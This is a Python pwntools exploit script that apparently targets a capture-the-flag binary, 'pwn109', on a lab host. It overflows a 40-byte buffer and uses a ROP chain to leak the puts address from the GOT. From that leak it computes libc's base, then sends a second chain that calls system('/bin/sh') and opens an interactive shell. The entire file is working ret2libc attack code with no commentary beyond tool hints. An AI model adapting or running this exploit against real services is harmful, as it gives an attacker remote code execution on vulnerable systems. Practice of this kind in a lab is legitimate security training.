from pwn import * 

e = ELF("./pwn109")
libc = ELF("./libc6.so")
puts_plt = e.plt['puts']
puts_got = e.got["puts"]
print(hex(puts_plt))
print(hex(puts_got))
main_addr = e.symbols["main"]
#libc = e.libc   # for local uses 
DEBUG = 1
if DEBUG == 0 : 
    p = process('./pwn109')
else:
    p = remote("10.10.216.17", 9009)

offset = 40
pop_rdi = 0x4012a3    # ropper -f ./pwn109 --search "pop rdi; ret"

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)  

# Send payload
p.recvuntil("Go ahead")
p.recvline() 
p.sendline(payload)
leak = p.recv(6)
puts_addr = u64(leak + b"\x00\x00")
print(f"Leaked puts address: {hex(puts_addr)}")

libc_base = puts_addr - libc.symbols["puts"]
system_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + next(libc.search("/bin/sh"))
print(f"sys address : {hex(system_addr)}")
payload = b'a' * offset
payload += p64(0x40101a) # ropper -f ./pwn109 --search "ret"
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
p.sendline(payload)
p.interactive()
 
